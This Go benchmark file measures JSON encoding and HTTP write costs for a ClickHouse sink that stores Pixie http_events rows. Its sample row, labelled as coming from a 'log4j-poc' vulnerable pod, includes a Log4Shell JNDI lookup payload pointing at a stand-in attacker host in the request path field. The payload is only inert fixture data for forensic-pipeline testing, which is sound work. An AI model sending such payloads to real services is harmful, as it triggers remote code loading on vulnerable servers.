// Copyright 2018- The Pixie Authors.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package sink

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"
)

// The sink's WritePixieRows path is one of the dominant CPU consumers
// when AE is under load: every controller fan-out pass writes a per-
// table batch (up to MaxBatchRows) and every row goes through the
// per-key normalisePixieValue switch AND the json.Encoder's reflection.
//
// These benchmarks isolate the encoding cost from the HTTP roundtrip:
//
//   - BenchmarkEncodeJSONEachRow_PixieShape: the encode loop alone
//     (mirrors clickhouse.go:160-167's hot path), no HTTP.
//   - BenchmarkWritePixieRows_LocalHTTPLoopback: the encode + HTTP
//     roundtrip against a no-op httptest server, so the timer includes
//     the HTTP client overhead AE actually pays per call.
//   - BenchmarkNormalisePixieValue_TimeRow: the per-row per-column
//     switch with a single time.Time field (the realistic per-pixie-row
//     shape — time_ is always TIME64NS so this fires on every row).

const benchTable = "http_events"

// makePixieRowsBatch builds a realistic per-pixie-row batch shape (12
// columns including a time_ + 5 strings + 6 ints). Matches the
// http_events schema in adaptive_export/internal/clickhouse/schema.sql.
func makePixieRowsBatch(n int) []map[string]any {
	out := make([]map[string]any, n)
	for i := range out {
		out[i] = map[string]any{
			"time_":         time.Unix(0, int64(1_700_000_000_000_000_000+i)),
			"upid":          fmt.Sprintf("0000000100000000-00000000-%016x", uint64(i)),
			"namespace":     "log4j-poc",
			"pod":           "backend-vulnerable-779cd9d765-mxr8t",
			"remote_addr":   "10.0.0.45",
			"remote_port":   int64(54321 + i%100),
			"local_addr":    "10.0.0.12",
			"local_port":    int64(8080),
			"trace_role":    int64(2),
			"encrypted":     uint8(0),
			"major_version": int64(1),
			"minor_version": int64(1),
			"content_type":  int64(0),
			"req_headers":   `{"User-Agent":"Apache-HttpClient/4.5.13","Accept":"*/*","Content-Type":"application/json"}`,
			"req_method":    "POST",
			"req_path":      "/api/v1/products/${jndi:ldap://attacker.example/Payload}",
			"req_body":      `{"id":42,"qty":1}`,
			"resp_headers":  `{"Content-Type":"application/json","Server":"jetty"}`,
			"resp_status":   int64(500),
			"resp_message":  "Internal Server Error",
			"resp_body":     `{"error":"NullPointerException"}`,
			"latency":       int64(123456789),
			"hostname":      "pixie-worker-node",
			"event_time":    time.Unix(0, int64(1_700_000_000_000_000_000+i)),
		}
	}
	return out
}

// BenchmarkEncodeJSONEachRow_PixieShape isolates the per-row encode
// cost the sink runs in clickhouse.go:160-167. With realistic 24-key
// http_events rows × the controller fan-out's typical batch sizes (up
// to MaxBatchRows = 1000), this is the encoder pressure AE sustains
// per controller pass.
func BenchmarkEncodeJSONEachRow_PixieShape(b *testing.B) {
	rows := makePixieRowsBatch(1000)
	b.ResetTimer()
	b.ReportAllocs()
	for n := 0; n < b.N; n++ {
		var buf bytes.Buffer
		enc := json.NewEncoder(&buf)
		enc.SetEscapeHTML(false)
		for _, r := range rows {
			obj := make(map[string]any, len(r))
			for k, v := range r {
				obj[k] = normalisePixieValue(v)
			}
			if err := enc.Encode(obj); err != nil {
				b.Fatal(err)
			}
		}
	}
}

// BenchmarkEncodeJSONEachRow_PixieShape_SmallBatch — 50-row batch (the
// realistic kubescape-driven controller pass for a quiet anomaly: 50 rows
// per table per refresh interval).
func BenchmarkEncodeJSONEachRow_PixieShape_SmallBatch(b *testing.B) {
	rows := makePixieRowsBatch(50)
	b.ResetTimer()
	b.ReportAllocs()
	for n := 0; n < b.N; n++ {
		var buf bytes.Buffer
		enc := json.NewEncoder(&buf)
		enc.SetEscapeHTML(false)
		for _, r := range rows {
			obj := make(map[string]any, len(r))
			for k, v := range r {
				obj[k] = normalisePixieValue(v)
			}
			if err := enc.Encode(obj); err != nil {
				b.Fatal(err)
			}
		}
	}
}

// BenchmarkEncodePixieRowsFast_PixieShape — the option-2 refactor.
// Walks each row in fixed schema column order, type-switches values
// directly to bytes.Buffer; no reflect, no encoding/json, no
// per-row map-key sort. Direct apples-to-apples comparison vs
// BenchmarkEncodeJSONEachRow_PixieShape above.
func BenchmarkEncodePixieRowsFast_PixieShape(b *testing.B) {
	rows := makePixieRowsBatch(1000)
	b.ResetTimer()
	b.ReportAllocs()
	for n := 0; n < b.N; n++ {
		var buf bytes.Buffer
		if err := encodePixieRowsFast(&buf, benchTable, rows); err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkEncodePixieRowsFast_PixieShape_SmallBatch(b *testing.B) {
	rows := makePixieRowsBatch(50)
	b.ResetTimer()
	b.ReportAllocs()
	for n := 0; n < b.N; n++ {
		var buf bytes.Buffer
		if err := encodePixieRowsFast(&buf, benchTable, rows); err != nil {
			b.Fatal(err)
		}
	}
}

// BenchmarkEncodePixieRowsFast_Pooled — option 1 on top of option 2.
// The bench mimics the real WritePixieRows shape: pull a buffer from
// the pool, encode, Reset+Put. Measures the steady-state allocation
// rate that AE actually pays in production (the first iteration's
// allocation gets amortised across b.N).
func BenchmarkEncodePixieRowsFast_Pooled_PixieShape(b *testing.B) {
	rows := makePixieRowsBatch(1000)
	b.ResetTimer()
	b.ReportAllocs()
	for n := 0; n < b.N; n++ {
		buf := encodeBufPool.Get().(*bytes.Buffer)
		buf.Reset()
		if err := encodePixieRowsFast(buf, benchTable, rows); err != nil {
			b.Fatal(err)
		}
		encodeBufPool.Put(buf)
	}
}

func BenchmarkEncodePixieRowsFast_Pooled_PixieShape_SmallBatch(b *testing.B) {
	rows := makePixieRowsBatch(50)
	b.ResetTimer()
	b.ReportAllocs()
	for n := 0; n < b.N; n++ {
		buf := encodeBufPool.Get().(*bytes.Buffer)
		buf.Reset()
		if err := encodePixieRowsFast(buf, benchTable, rows); err != nil {
			b.Fatal(err)
		}
		encodeBufPool.Put(buf)
	}
}

// BenchmarkNormalisePixieValue_TimeRow — per-row column iterations
// includes a time.Time normalisation that calls .UTC().Format() (one
// 30-byte string allocation per time field). Isolated cost.
func BenchmarkNormalisePixieValue_TimeRow(b *testing.B) {
	t := time.Now()
	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_ = normalisePixieValue(t)
	}
}

// BenchmarkWritePixieRows_LocalHTTPLoopback measures the full sink
// path including the HTTP roundtrip to a no-op server. This is the
// per-batch wall cost the controller pays — encode + connect + POST +
// header parse + summary parse. The httptest server returns the right
// X-ClickHouse-Summary header so summaryWroteFewerThan doesn't trip.
func BenchmarkWritePixieRows_LocalHTTPLoopback(b *testing.B) {
	rows := makePixieRowsBatch(1000)

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-ClickHouse-Summary", fmt.Sprintf(`{"read_rows":"0","read_bytes":"0","written_rows":"%d","written_bytes":"0"}`, len(rows)))
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	s, err := New(Config{
		Endpoint: srv.URL,
		Database: "forensic_db",
	})
	if err != nil {
		b.Fatal(err)
	}

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		if err := s.WritePixieRows(b.Context(), benchTable, rows); err != nil {
			b.Fatal(err)
		}
	}
}
